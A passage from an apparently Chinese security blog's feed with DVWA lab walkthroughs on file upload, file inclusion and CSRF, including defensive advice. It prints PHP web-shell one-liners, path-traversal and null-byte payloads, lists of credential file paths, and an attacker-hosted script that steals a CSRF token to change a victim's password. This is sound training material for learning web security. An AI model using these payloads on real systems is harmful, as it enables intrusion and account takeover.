images.&lt;/pre&gt;&apos;; } } ?&gt; 分析关键代码分析 $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); strrpos() 函数查找字符串在另一字符串中最后一次出现的位置(对大小写敏感）。 substr(string,start,length) 函数返回字符串的一部分(如果 start 参数是负数且 length 小于或等于 start，则 length 为 0)。 ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) getimagesize(string filename) 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 可以看到先读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”.jpg”、”.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。 漏洞利用直接上传一个图片马 ImpossibleFile Upload Source&lt;?php if( isset( $_POST[ &apos;Upload&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // File information $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1); $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ]; $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ]; $uploaded_tmp = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ]; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;; //$target_file = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;; $target_file = md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; $temp_file = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) ); $temp_file .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &apos;image/jpeg&apos; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析magecreatefromjpeg ( filename ) 函数返回图片文件的图像标识，失败返回false imagecreatefromjpeg — 由文件或 URL 创建一个新图象。 imagejpeg ( image , filename , quality) 从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。 imagedestroy( img ) 函数销毁图像资源 可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件 参考渗透测试方法论之文件上传 DVWA之PHP文件上传漏洞（File Upload）]]></content>
      <tags>
        <tag>File_Upload</tag>
        <tag>practice</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-File_Inclusion]]></title>
    <url>%2F2018%2F07%2F29%2FDVWA-File_Inclusion%2F</url>
    <content type="text"><![CDATA[Vulnerability: File InclusionIntruduceFile Inclusion，意思是文件包含（漏洞）： 产生原因：由于开发人员编写源码时，要将重复使用的代码插入到单个的文件中，并在需要时调用这段代码；而由于并未对代码中存在文件包含的函数入口做过滤，导致客户端可以提交恶意代码到服务器并执行。 文件包含漏洞是“代码注入”的一种，其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含，文件包含漏洞可能出现在JSP、PHP、ASP等语言中。 利用条件若要成功利用文件包含漏洞进行攻击，需要满足以下两个条件：Web应用采用include/require()等文件包含函数通过动态变量的方式引入需要包含的文件 用户能够控制该动态变量 本地文件包含（利用前提）1、相关函数内的参数可控 远程文件包含（利用前提）1、相关函数内的参数可控 2、allow_url_fopen = On 当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 常见利用方式PHP包含漏洞结合上传漏洞； PHP包含读文件； PHP包含写文件； PHP包含日志文件； PHP截断包含； PHP内置伪协议利用。 Low File Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; ?&gt; 分析服务器端未对page参数做任何过滤和检查 点击 file1.php 漏洞利用1、本地包含、查看敏感信息、绝对路径直接尝试访问 /etc/passwd Xampp的php环境配置文件： Apache：\xampp\apache\conf\httpd.conf PHP：\xampp\php\php.ini MySQL：\xampp\mysql\bin\my.ini phpMyAdmin：\xampp\phpMyAdmin\config.inc.php FileZilla FTP：\xampp\FileZillaFTP\FileZilla Server.xml Mercury Mail：.\xampp\MercuryMail\MERCURY.INI Sendmail：\xampp\sendmail\sendmail.ini 主文件都存放在 htdocs 文件夹中（\xampp\htdocs） 尝试读取php.ini 成功读取，可以看到 magic_quotes_gpc = Off allow_url_fopen on allow_url_include on 配置文件中的Magic_quote_gpc选项为off。在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别 &lt;?php include(&quot;inc/&quot; . $_GET[&apos;file&apos;] . &quot;.htm&quot;); ?&gt; %00截断： ?file=../../../../../../../../../etc/passwd%00 (需要 magic_quotes_gpc=off，PHP小于5.3.4有效) %00截断目录遍历： ?file=../../../../../../../../../var/www/%00 (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris) 当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。 相对路径修改参数 file1.php为一些常见配置文件路径 /dvwa/vulnerabilities/fi/?page=../../../../apache/conf/httpd.conf /dvwa/vulnerabilities/fi/?page=../../../../mysql/bin/my.ini 2、包含Apache日志文件在日志文件中写入phpinfo http://192.168.10.11/dvwa/vulnerabilities/fi/?page=C:/xampp/apache/logs/access.log 写入一句话 &lt;?php @eval($_POST[‘Cknife’]);?&gt; 一开始用的菜刀没连上，一直以为是出了啥问题，换了把菜刀连上了 3、远程文件包含远程代码执行： ?file=[http|https|ftp]://example.com/shell.txt (需要allow_url_fopen=On并且 allow_url_include=On) 首先在我们自己的主机上制作一个包含写入一句话的txt文本 &lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;), &quot;&lt;?php eval(\$_POST[111]);?&gt;&quot;);?&gt; 在远程包含我们构造好的test.txt文本，通过该文本在目标主机上写入一句话菜刀连接 4、配合上传漏洞写webshell和文件上传漏洞或者SQL注入漏洞等一同利用，通过利用前面的漏洞将一句话木马shell.php文件上传到Web服务器中，然后再通过文件包含漏洞包含出现从而得到shell 5、使用PHP封装协议读取文件和写入PHP文件####### 1、读取文件：先看看读取文件，如输入page参数值为： php://filter/read=convert.base64-encode/resource=../../../../mysql/bin/my.ini 2、写入文件：利用php流input： ?file=php://input (需要allow_url_include=On) MiddleFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Input validation $file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); $file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); ?&gt; 分析使用str_replace函数是极其不安全的，因为可以使用双写叠加绕过替换规则。 将输入的url参数中包含的“http://”、“https://”、“../”、“..\”字符串替换成空的字符串，即过滤了远程文件包含和相对路径，对于本地文件绝对路径包含并没有任何过滤；对于这个替换函数我们可以使用嵌套叠加来绕过 漏洞利用使用嵌套叠加绕过绝对路径过滤../../../../apache/conf/httpd.conf 我们构造如下嵌套的路径就可以绕过了 ..././..././..././..././apache/conf/httpd.conf 使用嵌套叠加绕过远程文件包含过滤 HighFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Input validation if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 分析nmatch() 函数根据指定的模式来匹配文件名或字符串。 此函数对于文件名尤其有用，但也可以用于普通的字符串。普通用户可能习惯于 shell 模式或者至少其中最简单的形式 ‘?’ 和 ‘*’ 通配符，因此使用 fnmatch() 来代替 ereg() 或者 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便 该函数将只匹配file开头和名为include.php的文件，本质就是利用白名单机制进行过滤，不过也不完全是白名单，其他文件一律报错，看似不能绕过，但是我们可以利用file协议绕过防护策略。 漏洞利用file协议绕过 ImpossibleFile Inclusion Source&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Only allow include.php or file{1..3}.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; } ?&gt; 分析使用了白名单进行检查是否为可信的文件，暂无利用方法 系统常见的敏感信息路径：Windows系统C:\boot.ini //查看系统版本 C:\Windows\System32\inetsrv\Metabase.xml //IIS配置文件 C:\Windows\repair\sam //存储Windows系统初次安装的密码 C:\Programe Files\mysql\my.ini //Mysql配置 C:\Programe Files\mysql\data\mysql\use.MYD //Mysql root C:\Windows\php.ini //php 配置信息 C:\Windows\mysql.ini // Mysql配置文件 C:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 C:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 C:\Program Files\Serv-U\ServUDaemon.ini Linux系统/etc/passwd //用户信息文件 /etc/shadow //密码 /usr/local/app/apache2/conf/httpd.conf //apache2默认设置文件 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟主机设置 /usr/local/app/php5/lib/php.ini //PHP相关设置 /etc/httpd/conf/httpd.conf //apache配置文件 /etc/my.cnf //Mysql的配置文件 /etc/sysconfig/iptables //从中得到防火墙规则策略 /etc/rsyncd.conf //同步程序配置文件 /etc/sysconfig/network-scripts/ifcfg-eth0 //查看IP. /etc/redhat-release //系统版本 /etc/issue /etc/issue.net 检测方法1、找到有包含函数的页面，对函数内容进行替换查看结果； 注意path参数，一般可能的变量名： src、 filename、 file、 path、filepath、uri…… 2、可以使用工具来代替手工的过程，如Kadimus、Burpsuite的插件LFI scanner checks等； 3、白盒测试时，可以在源代码中查看allow_url_fopen、allow_url_include等敏感函数是否开启。 文件包含防护代码层1.严格判断包含的参数是否外部可控，因为文件包含漏洞利用成功与否的关键点就在于被包含的文件是否可被外部控制； 2.路径限制：限制被包含的文件只能在某一文件夹内，一定要禁止目录跳转字符，如：“../”； 3.包含文件验证：验证被包含的文件是否是白名单中的一员； 4.尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include(&quot;head.php&quot;);。 5.尽量不使用远程文件包含，如果业务无法避免，尽量校验远程主机域名。 使用白名单指定能包含的文件 &lt;?php $filename = $_GET[&apos;filename&apos;]; switch($filename){ case &apos;head&apos;; case &apos;foot&apos;; case &apos;main&apos;; include &apos;var/www/html/&apos;.$filename.&apos;php&apos;; break; default: include &apos;/var/www/html/main.php&apos;; } ?&gt; 设置open_basedir的值将允许包含的文件限定在某一特定目录内。 注：open_basedir是目录前缀open_basedir=/var/www/testopen_basedir=/var/www/test/ 第一种情况可以允许/var/www/test 、 /var/www/test123 等目录如果要严格限制目录应使用第二种 参考新手指南：DVWA-1.9全级别教程之File Inclusion DVWA之PHP文件包含漏洞（File Inclusion） 本地文件包含漏洞&amp;&amp;PHP利用协议&amp;&amp;实践源码 php文件包含漏洞]]></content>
      <tags>
        <tag>practice</tag>
        <tag>DVWA</tag>
        <tag>File_Inclusion</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-CSRF]]></title>
    <url>%2F2018%2F07%2F26%2FDVWA-CSRF%2F</url>
    <content type="text"><![CDATA[IntroductionCSRF（Cross-site request forgery）跨站请求伪造: 主要利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 跨站脚本（XSS）与跨站请求伪造(CSRF)区别XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 Low 服务端源代码&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析1、判断是否设置了Change变量 2、新设置的密码与确认密码是否相同 3、相同则将新密码做md5然后做update 4、可以看到并没有验证新旧密码相同，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现） 漏洞利用1、观察请求方式 /dvwa/vulnerabilities/csrf/?password_new=test1&amp;password_conf=test1&amp;Change=Change 2、构造url更改点击点击链接受害者的密码 /dvwa/vulnerabilities/csrf/?password_new=yourpasswd&amp;password_conf=yourpasswd&amp;Change=Change 当受害人刚刚登入访问了该站点，session没有失效，点击了这个链接后他的密码就会变成我们构造好的密码，为了增加隐蔽性可以将url换成短url，更高级的可以制作一个攻击的页面，让受害者访问，不知不觉完成攻击（注意使用相同的浏览器） Middle服务端源代码CSRF Source &lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ &apos;HTTP_REFERER&apos; ] ,$_SERVER[ &apos;SERVER_NAME&apos; ]) !== false ) { // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&apos;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&apos;t look correct.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } ?&gt; 分析与之前相比，这里检查了是否同源 if( stripos( $_SERVER[ ‘HTTP_REFERER’ ] ,$_SERVER[ ‘SERVER_NAME’ ]) int eregi(string pattern, string string) 检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。 可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.xx.xx），希望通过这种机制抵御CSRF攻击。 漏洞利用过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.xx.xx）我们可以将攻击页面命名为192.168.10.11.html（页面被放置在攻击者的服务器里，这里是192.168.10.10）就可以绕过了 &lt;img src=&quot;http://192.168.10.11/dvwa/pvulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;404&lt;h1&gt; &lt;h2&gt;file not found.&lt;h2&gt; 抓包后在Repeater中修改HTTP数据包中的Referer参数为 http://192.168.10.10/admin/test_csrf_192.168.10.11.html High服务端源代码&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析关键代码 // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Generate Anti-CSRF token generateSessionToken(); High级别的带入引入了Anti-CSRF token,用户每次访问改密页面时，服务器会通过generateSessionToken()返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有客户端提交的token参数与服务器端一致时，服务器端才会处理客户端的响应。 漏洞利用要绕过High Security Level的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。 1、试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。 xss.js alert(document.cookie); var theUrl = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/&apos;; if(window.XMLHttpRequest) { xmlhttp = new XMLHttpRequest(); }else{ xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); } var count = 0; xmlhttp.withCredentials = true; xmlhttp.onreadystatechange=function(){ if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) { var text = xmlhttp.responseText; var regex = /user_token\&apos; value\=\&apos;(.*?)\&apos; \/\&gt;/; var match = text.match(regex); console.log(match); alert(match[1]); var token = match[1]; var new_url = &apos;http://192.168.10.11/dvwa/vulnerabilities/csrf/?user_token=&apos;+token+&apos;&amp;password_new=test&amp;password_conf=test&amp;Change=Change&apos;; if(count==0){ count++; xmlhttp.open(&quot;GET&quot;,new_url,false); xmlhttp.send(); } } }; xmlhttp.open(&quot;GET&quot;,theUrl,false); xmlhttp.send(); xss.js放置于攻击者的网站上：http://192.168.10.10/admin/xss.js 2、DOM XSS与CSRF结合： CSRF结合同Security Level的DOM XSS，通过ajax实现跨域请求来获取用户的user_token，用以下链接来让受害者访问： http://192.168.10.11/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://192.168.10.10/admin/xss.js%22%3E%3C/script%3E 成功修改密码为test Impossible 服务端源代码&lt;?php if( isset( $_GET[ &apos;Change&apos; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $pass_curr = $_GET[ &apos;password_current&apos; ]; $pass_new = $_GET[ &apos;password_new&apos; ]; $pass_conf = $_GET[ &apos;password_conf&apos; ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) { // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 分析关键代码 // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); / Generate Anti-CSRF token generateSessionToken(); 利用PDO技术防御SQL注入，需要输入原密码来进行验证，在不知道原密码的情况下无法进行攻击 $pass_curr = stripslashes( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); CSRF漏洞的分类及检测挖掘方法主要有三种：第一种：请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。 检测方法：网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。 第二种：请求是个POST请求，post请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。 检测方法：网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。如果有token等参数，可以尝试将token去掉，然后再将referer也去掉，进行验证。这种CSRF漏洞的利用，是需要在自己服务器构造一个form表单的，然后将服务器form表单的URL作为CSRF攻击进行利用的，或者用js代码生成form表单，或者用ajax实现。 第三种：请求是POST，post请求中没有token参数，但是验证了referer信息。然而可以将post请求改写为get请求，然后通过第一种情况下的那个方法利用。 检测方法：就是先执行了第二种的验证后，发现有对CSRF进行防御。然后将post请求改写为GET请求，发现仍然可以成功执行。漏洞成因是因为服务器端接收请求参数的时候，没有严格的用$_POST 而是用的类似于 $_REQUEST这种post，get请求的参数都可以接收的写法。 防护措施主要可以应用以下介绍的几种方法： 限制验证cookie的到期时间：这些cookie的合法时间越短，黑客利用你的Web应用程序的机会就越小。不过，这个时间越短，用户就越不方便。因此，你需要在安全性和方便性之间进行平衡。 执行重要业务之前，要求用户提交额外的信息：要求用户在进行重要业务前输入口令，这可以防止黑客发动CSRF攻击（只要浏览器中没有包含口令），因为这种重要信息无法预测或轻易获得。 使用秘密的无法预测的验证符号：当保存在用户浏览器中的cookie仅由一次会话确认时，CSRF攻击才会有效。所以在每次HTTP请求（当然攻击者无法提前知道）中都有附加的特定会话的信息，这样就可以挫败CSRF攻击。不过，如果这种应用程序存在跨站脚本漏洞，黑客就有可能访问这种验证符号。 使用定制的HTTP报头：如果执行交易的所有请求都使用XMLHttpRequest并附加一个定制的HTTP报头，同时拒绝缺少定制报头的任何请求，就可以用XMLHttpRequest API来防御CSRF攻击。由于浏览器通常仅准许站点将定制的HTTP报头发送给相同站点，从而了防止由CSRF攻击的源站点所发起的交易。 检查访问源的报头：在浏览者发送HTTP请求时，它通常会包含源自访问源报头的URL。理论上讲，你可以使用这些信息来阻止源自其它任何站点（而不是来自Web应用程序自身）的请求。不过，访问源报头并不总是可用的，（例如，有些单位由于私密性的缘故而将它剥离了），或者这个报头容易被欺骗，所以说，这条措施并不真正有效。 参考白帽子挖洞—跨站请求伪造（CSRF）篇 DVWA CSRF 通关教程]]></content>
      <tags>
        <tag>practice</tag>
        <tag>DVWA</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA-Brute_Force]]></title>
    <url>%2F2018%2F07%2F23%2FDVWA-Brute_Force%2F</url>
